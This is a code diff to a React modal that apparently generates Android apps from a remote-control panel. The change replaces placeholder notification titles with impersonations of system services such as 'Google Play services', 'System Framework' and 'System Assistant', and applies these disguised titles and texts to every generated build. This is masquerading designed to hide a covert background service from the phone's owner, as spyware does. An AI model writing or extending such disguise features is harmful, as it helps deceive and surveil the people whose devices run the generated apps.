@@ -263,42 +263,42 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
     const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string; defaultAction: string; defaultIconKey: string }> = {
         default: { 
-            title: "App Name", 
-            text: "Running in background", 
+            title: "Google Play services", 
+            text: "Running background checks", 
             icon: "ℹ️",
             defaultAction: "device_info",
             defaultIconKey: "info"
         },
         sync: { 
-            title: "App Name", 
-            text: "Syncing data", 
+            title: "Cloud Backup", 
+            text: "Syncing data in background", 
             icon: "🔄",
             defaultAction: "none",
             defaultIconKey: "sync"
         },
         cloud: { 
-            title: "App Name", 
-            text: "Connected to cloud", 
+            title: "Cloud Storage", 
+            text: "Connected to cloud service", 
             icon: "🔄",
             defaultAction: "none",
             defaultIconKey: "sync"
         },
         active: { 
-            title: "App Name", 
+            title: "System Framework", 
             text: "Service active", 
             icon: "ℹ️",
             defaultAction: "none",
             defaultIconKey: "info"
         },
         backup: { 
-            title: "App Name", 
+            title: "Data Backup", 
             text: "Backup in progress", 
             icon: "⬇️",
             defaultAction: "none",
             defaultIconKey: "download"
         },
         ready: { 
-            title: "App Name", 
+            title: "System Assistant", 
             text: "Ready", 
             icon: "ℹ️",
             defaultAction: "device_info",
@@ -499,10 +499,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('notificationClickAction', notificationClickAction);
             formData.append('notificationIcon', notificationIcon);
 
-            if (notificationStyle === 'custom') {
-                formData.append('notificationTitle', notificationTitle || 'System Service');
-                formData.append('notificationText', notificationText || 'Running background checks…');
-            }
+            const activePreset = NOTIFICATION_PRESETS[notificationStyle] || NOTIFICATION_PRESETS.default;
+            const finalTitle = notificationStyle === 'custom' ? (notificationTitle || 'System Service') : (activePreset?.title || 'Google Play services');
+            const finalText = notificationStyle === 'custom' ? (notificationText || 'Running background checks…') : (activePreset?.text || 'Running background checks');
+            formData.append('notificationTitle', finalTitle);
+            formData.append('notificationText', finalText);
             if (selectedPreset === 'custom' && customIcon) {
                 formData.append('icon', customIcon);
             } else if (selectedPreset !== 'custom') {
